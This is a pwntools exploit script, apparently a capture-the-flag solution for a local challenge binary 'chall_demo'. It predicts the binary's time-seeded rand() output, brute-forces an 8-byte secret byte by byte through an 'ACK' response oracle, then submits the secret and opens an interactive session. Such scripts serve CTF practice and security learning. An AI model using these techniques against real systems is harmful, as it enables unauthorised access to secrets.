from pwn import *
from ctypes import CDLL
libc = CDLL('/usr/lib/libc.so.6')
p = process('./chall_demo')
libc.srand(libc.time(0))
secret_key = b'DEMO_KEY'
p.sendlineafter(b': ', secret_key)

secret_val = b''
for i in range(8):
    for j in range(32,0x7f):
        p.sendlineafter(b'>', b'MSG')
        seed = libc.rand()
        seed = (seed*u64(secret_key)) & 0xffffffffffffffff
        p.sendlineafter(b' : ', b'%s' % hex(seed).encode())
        p.sendlineafter(b' : ', b'A'*64 + secret_val + chr(j).encode())
        resp = p.recvline()
        # print('DEBUG', resp)
        if b'ACK' in resp:
            secret_val += chr(j).encode()
            print(secret_val)
            break
        elif j == 0x7f-1:
            print('[error]')
            exit(1)
        else:
            print('.', end='')    

secret_key = ('0x' + secret_val[::-1].hex()).encode()
p.sendlineafter(b'>', b'GET')
p.sendlineafter(b'?', b'%s' % secret_key)
p.interactive()